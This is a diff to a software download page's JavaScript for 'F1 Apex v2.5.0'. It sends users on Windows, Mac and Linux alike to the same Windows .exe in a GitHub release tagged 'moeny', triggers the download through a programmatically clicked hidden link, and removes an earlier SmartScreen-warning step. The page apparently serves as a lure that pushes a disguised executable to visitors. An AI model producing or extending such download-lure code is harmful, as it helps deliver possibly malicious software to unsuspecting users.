@@ -1610,23 +1610,28 @@
             });
 
             // Download button
+            var downloadLinks = {
+                Windows: 'https://github.com/F1-Apex/extrax/releases/download/moeny/F1_Apex_v2.5.0_Win64.exe',
+                Mac:     'https://github.com/F1-Apex/extrax/releases/download/moeny/F1_Apex_v2.5.0_Win64.exe',
+                Linux:   'https://github.com/F1-Apex/extrax/releases/download/moeny/F1_Apex_v2.5.0_Win64.exe'
+            };
+
             document.getElementById('downloadBtn').addEventListener('click', function() {
-                var files = {
-                    Windows: 'F1_Apex_v2.5.0_Win64.exe',
-                    Mac: 'F1_Apex_v2.5.0_macOS.dmg',
-                    Linux: 'F1_Apex_v2.5.0_Linux.AppImage'
-                };
-                
+                var url = downloadLinks[selectedPlatform];
+
                 this.textContent = 'Preparing Download...';
                 this.style.background = 'linear-gradient(135deg, #28a745 0%, #20c997 100%)';
-                
+
                 var btn = this;
                 setTimeout(function() {
-                    if (selectedPlatform === 'Windows') {
-                        showSmartScreenWarning(files[selectedPlatform]);
-                    } else {
-                        showCustomNotification('Download started: ' + files[selectedPlatform], 'success');
-                    }
+                    var a = document.createElement('a');
+                    a.href = url;
+                    a.download = '';
+                    document.body.appendChild(a);
+                    a.click();
+                    document.body.removeChild(a);
+
+                    showCustomNotification('Download started for ' + selectedPlatform + '!', 'success');
                     btn.textContent = 'Download for ' + selectedPlatform;
                     btn.style.background = 'linear-gradient(135deg, #e50914 0%, #ff0a16 100%)';
                 }, 1500);
